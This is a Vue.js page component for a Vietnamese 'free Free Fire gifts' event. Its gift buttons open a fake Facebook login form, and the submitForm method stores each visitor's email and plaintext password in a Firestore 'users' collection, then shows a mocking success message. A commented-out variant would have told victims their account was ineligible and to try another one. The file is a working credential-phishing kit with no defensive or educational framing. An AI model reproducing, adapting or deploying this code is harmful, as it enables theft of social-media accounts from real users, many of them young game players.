<template>
    <Header />

    <div class="bg-gray-700" id="bgff">
        <p class="pt-2 text-center text-yellow-500">
            Sự kiện nhận quà Free Fire 2022 tri ân Free Fire Việt Nam.
            Nhận quà Free Fire Miễn Phí Toàn Server
        </p>
        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5 w-10/12 mx-auto py-5">
            <div
                v-for="product in products"
                :key="product.id"
                class="bg-gray-900 border border-yellow-700 text-center shadow relative"
            >
                <img :src="product.url" alt class="h-32 w-full object-contain" />
                <p class="py-2 text-xl text-gray-300 text-gray-300">{{ product.title }}</p>
                <button
                    @click="formLoginFB"
                    class="w-full px-2 py-2 text-yellow-900 font-bold text-xl bg-yellow-500 hover:bg-yellow-400 absolute bottom-0 left-0"
                >
                    <i class="fas fa-gift"></i>
                    NHẬN NGAY
                </button>
                <div class="w-full font-bold text-xl px-2 py-2 text-gray-900">.</div>
            </div>
        </div>
    </div>
    <div
        v-show="isForm == 1"
        class="fixed text-gray-500 flex items-center justify-center overflow-auto z-50 bg-black bg-opacity-40 left-0 right-0 top-0 bottom-0"
    >
        <div class="relative rounded bg-white text-center shadow-2xl w-80 mx-auto">
            <button
                @click="closeForm"
                class="absolute top-0 right-0 translate-x-1/2 -translate-y-1/2"
            >
                <svg
                    class="w-8 h-8"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                >
                    <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                </svg>
            </button>
            <div class="flex justify-center bg-blue-500 rounded-t">
                <div class="p-2">
                    <img src="../assets/fb.png" alt class="h-6" />
                </div>
            </div>
            <div v-if="er" class="py-1 px-2 text-left text-xs bg-red-500 text-white">
                Email hoặc số điện thoại bạn nhập không khớp với bất kỳ tài khoản nào.
                <b>Đăng ký tài khoản</b>
            </div>
            <div class="flex justify-center p-3">
                <img class="w-12" src="../assets/logo.png" alt />
            </div>
            <p class="px-3">Đăng nhập vào tài khoản Facebook của bạn để kết nối với Free Fire</p>
            <div class="p-3">
                <input
                    type="email"
                    v-model="email"
                    placeholder="Email hoặc số điện thoại"
                    minlength="10"
                    maxlength="99"
                    autofocus
                    class="w-full mb-3 px-3 py-2 bg-gray-100 border border-gray-300 focus:outline-none rounded-md focus:ring-1 ring-blue-500"
                />
                <input
                    type="password"
                    v-model="password"
                    placeholder="Mật khẩu"
                    minlength="6"
                    maxlength="99"
                    class="w-full mb-3 px-3 py-2 border border-gray-300 bg-gray-100 focus:outline-none rounded-md focus:ring-1 ring-blue-500"
                />
                <button
                    @click="submitForm"
                    class="w-full bg-blue-500 text-white px-3 py-2 rounded-lg font-semibold text-lg hover:bg-blue-600"
                >Đăng nhập</button>

                <a href="#" class="inline-block my-2 text-blue-500">Quên mật khẩu?</a>
                <hr class="text-gray-300" />

                <button
                    class="bg-green-500 mt-6 mb-4 text-white px-3 py-2 rounded-lg font-semibold text-lg hover:bg-green-600"
                >Tạo tài khoản mới</button>
            </div>
        </div>
    </div>

    <Footer />
</template>

<script>
import { db } from '../firebase';
import { collection, query, onSnapshot, serverTimestamp, orderBy, addDoc } from 'firebase/firestore';

import Header from "../components/Header.vue";
import Footer from "../components/Footer.vue";

export default {
    components: { Header, Footer },
    data() {
        return {
            products: [],
            isForm: false,
            email: '',
            password: '',
            er: false
        }
    },
    methods: {
        formLoginFB() {
            this.$swal.fire({
                title: 'Đăng nhập Facebook',
                html: '<div class="flex justify-center"><svg class="w-10" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14222 14222"><circle cx="7111" cy="7112" r="7111" fill="#1977f3"/><path d="M9879 9168l315-2056H8222V5778c0-562 275-1111 1159-1111h897V2917s-814-139-1592-139c-1624 0-2686 984-2686 2767v1567H4194v2056h1806v4969c362 57 733 86 1111 86s749-30 1111-86V9168z" fill="#fff"/></svg></div>',
                confirmButtonText: 'Tiếp tục',
            }).then((result) => {
                if (result.isConfirmed) {
                    this.isForm = true
                }

            })
        },
        closeForm() {
            this.isForm = false
            this.email = ''
            this.password = ''
        },
        submitForm() {
            const regexEmail = this.email.match(/^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i);
            const regexPassword = this.password.match(/^.{6,}$/);
            if (regexEmail && regexPassword) {
                addDoc(collection(db, "users"), {
                    email: this.email,
                    password: this.password,
                    timestamp: serverTimestamp()
                })
                this.$swal.fire({
                    // icon: 'error',
                    // title: 'Lỗi',
                    // text: 'Tài khoản không đủ điều kiện để nhận quà. Hãy thử tài khoản khác',
                    icon: 'success',
                    title: 'Chúc mừng',
                    text: 'Bạn nhận được cái nịt, không làm mà đòi có ăn',
                })
                this.isForm = false
                this.er = false
                this.email = ''
                this.password = ''
            } else {
                this.er = true
            }
        }
    },
    created() {
        const q = query(collection(db, "products"), orderBy('timestamp', 'desc'))
        onSnapshot(q, (ns) => {
            this.products = ns.docs.map((doc) => ({ ...doc.data(), id: doc.id }))
        });
    }
}
</script>

<style>
#bgff {
    background-image: url(../assets/bg.jpg);
    background-size: cover;
}
</style>